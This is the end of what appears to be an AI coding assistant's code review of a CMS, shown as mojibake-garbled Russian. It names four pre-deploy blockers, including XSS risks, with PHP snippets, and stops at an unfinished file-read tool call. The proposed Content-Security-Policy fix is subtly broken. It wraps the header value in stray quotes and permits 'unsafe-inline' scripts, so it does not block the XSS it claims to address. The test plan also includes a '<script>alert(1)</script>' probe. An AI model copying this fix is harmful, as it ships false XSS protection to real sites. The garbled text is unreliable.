- ‚ö†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è —Å–ª–æ–∂–Ω–æ—Å—Ç—å
- ‚ö†Ô∏è –ù—É–∂–Ω–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –Ω–∞ frontend

**–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø:** ‚úÖ **–û–ø—Ü–∏—è A** ‚Äî –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å rendered_html –¢–û–õ–¨–ö–û –ø—Ä–∏ Publish, –ù–ï –ø—Ä–∏ –∫–∞–∂–¥–æ–º Save.

---

## üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –ë–õ–û–ö–ï–†–´ (MUST FIX BEFORE DEPLOY)

### 1. UpdatePage Use Case ‚Äî –ù–ï –û–ë–†–ê–ë–ê–¢–´–í–ê–ï–¢ renderedHtml
**–§–∞–π–ª:** `backend/src/Application/UseCase/UpdatePage.php`  
**–°—Ç—Ä–æ–∫–∞:** –ü–æ—Å–ª–µ 95  
**–ò–∑–º–µ–Ω–µ–Ω–∏–µ:**
```php
if (isset($data['renderedHtml'])) {
    $page->setRenderedHtml($data['renderedHtml']);
}
```

### 2. XSS Protection ‚Äî –û–¢–°–£–¢–°–¢–í–£–Æ–¢ CSP Headers
**–§–∞–π–ª:** `backend/src/Presentation/Controller/PublicPageController.php`  
**–°—Ç—Ä–æ–∫–∞:** 90 (–ø–µ—Ä–µ–¥ echo)  
**–ò–∑–º–µ–Ω–µ–Ω–∏–µ:**
```php
header('Content-Security-Policy: "default-src \'self\'; script-src \'self\' \'unsafe-inline\'; img-src \'self\' data: https:;"');
header('X-Content-Type-Options: nosniff');
```

### 3. Frontend Escaping ‚Äî –ù–ï –í–°–ï –ü–û–õ–Ø –≠–ö–†–ê–ù–ò–†–û–í–ê–ù–´
**–§–∞–π–ª:** `frontend/editor.js`  
**–ú–µ—Ç–æ–¥—ã:** `renderMainScreen`, `renderPageHeader`, etc.  
**–ò–∑–º–µ–Ω–µ–Ω–∏–µ:** –û–±–µ—Ä–Ω—É—Ç—å –í–°–ï `${variable}` –≤ `${this.escape(variable)}`

### 4. Save Strategy ‚Äî –û–ü–†–ï–î–ï–õ–ò–¢–¨ –ö–û–ì–î–ê –ì–ï–ù–ï–†–ò–†–û–í–ê–¢–¨ HTML
**–†–µ—à–µ–Ω–∏–µ:** –ì–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å rendered_html –¢–û–õ–¨–ö–û –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –≤ —Å—Ç–∞—Ç—É—Å Published (—á–µ—Ä–µ–∑ –æ—Ç–¥–µ–ª—å–Ω—ã–π endpoint `/publish` –∏–ª–∏ –ø—Ä–∏ save –µ—Å–ª–∏ status –º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ published).

---

## ‚ö†Ô∏è –ù–ï–ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–õ–£–ß–®–ï–ù–ò–Ø (NICE TO HAVE)

1. ‚úÖ CreatePage Use Case ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É renderedHtml (–Ω–∏–∑–∫–∏–π –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç)
2. ‚úÖ Compression ‚Äî —Å–∂–∏–º–∞—Ç—å HTML –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π (–æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è)
3. ‚úÖ Regenerate Button ‚Äî –∫–Ω–æ–ø–∫–∞ "–û–±–Ω–æ–≤–∏—Ç—å HTML" –≤ –∞–¥–º–∏–Ω–∫–µ
4. ‚úÖ Version Control ‚Äî —Ö—Ä–∞–Ω–∏—Ç—å –∏—Å—Ç–æ—Ä–∏—é rendered_html (–¥–ª—è rollback)

---

## –§–ò–ù–ê–õ–¨–ù–´–ô –í–ï–†–î–ò–ö–¢

### üî¥ **–ë–õ–û–ö–ò–†–£–ï–¢ –î–ï–ü–õ–û–ô ‚Äî 4 –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –ü–†–û–ë–õ–ï–ú–´**

1. üî¥ **UpdatePage –ù–ï –°–û–•–†–ê–ù–Ø–ï–¢ renderedHtml** ‚Äî —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç
2. üî¥ **XSS –£–Ø–ó–í–ò–ú–û–°–¢–¨** ‚Äî –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç CSP headers
3. üî¥ **Frontend Escaping –Ω–µ–ø–æ–ª–Ω—ã–π** ‚Äî —Ä–∏—Å–∫ XSS —á–µ—Ä–µ–∑ –¥–∞–Ω–Ω—ã–µ –±–ª–æ–∫–æ–≤
4. üî¥ **–°—Ç—Ä–∞—Ç–µ–≥–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞** ‚Äî –∫–æ–≥–¥–∞ –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å HTML?

### –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò:

**Phase 1 (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ü–ï–†–ï–î –î–ï–ü–õ–û–ï–ú):**
1. ‚úÖ –ò—Å–ø—Ä–∞–≤–∏—Ç—å UpdatePage ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É renderedHtml
2. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å CSP headers –≤ PublicPageController
3. ‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –≤—Å–µ render*() –º–µ—Ç–æ–¥—ã ‚Äî –¥–æ–±–∞–≤–∏—Ç—å this.escape()
4. ‚úÖ –†–µ—à–∏—Ç—å: –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å HTML –ø—Ä–∏ save(published) –∏–ª–∏ –ø—Ä–∏ –æ—Ç–¥–µ–ª—å–Ω–æ–º publish()

**Phase 2 (–ü–û–°–õ–ï –î–ï–ü–õ–û–Ø):**
1. –î–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É renderedHtml –≤ CreatePage
2. –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å: compression, CDN –¥–ª—è —Å—Ç–∞—Ç–∏–∫–∏
3. –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥: —Ä–∞–∑–º–µ—Ä –ë–î, –≤—Ä–µ–º—è save

**–û—Ü–µ–Ω–∫–∞ –≤—Ä–µ–º–µ–Ω–∏:**
- Phase 1: **2-4 —á–∞—Å–∞** (–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è)
- Phase 2: **1-2 –¥–Ω—è** (–æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏)

---

## NEXT STEPS

1. **STOP** ‚Äî –ù–ï –î–ï–ü–õ–û–ò–¢–¨ —Ç–µ–∫—É—â—É—é –≤–µ—Ä—Å–∏—é
2. **FIX** ‚Äî –ò—Å–ø—Ä–∞–≤–∏—Ç—å 4 –±–ª–æ–∫–µ—Ä–∞ –∏–∑ Phase 1
3. **TEST** ‚Äî E2E —Ç–µ—Å—Ç—ã:
   - Save published page ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å rendered_html –≤ –ë–î
   - Open public page ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ HTML –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π
   - XSS test ‚Üí –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å <script>alert(1)</script>
4. **DEPLOY** ‚Äî –ü–æ—Å–ª–µ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –≤—Å–µ—Ö —Ç–µ—Å—Ç–æ–≤

**–í—Ä–µ–º—è –¥–æ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∫ –ø—Ä–æ–¥–∞–∫—à–µ–Ω—É:** ~4 —á–∞—Å–∞ (—Å —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º).

<function_calls>
<invoke name="read_file">
<parameter name="filePath">c:\Users\annal\Documents\–ú–æ–∏ —Å–∞–π—Ç—ã\–°–∞–π—Ç –æ –∑–¥—Ä–∞–≤–æ–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –≤ –ë—Ä–∞–∑–∏–ª–∏–∏\–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ —Å–∞–π—Ç–∞ —Å CMS\backend\src\Application\UseCase\CreatePage.php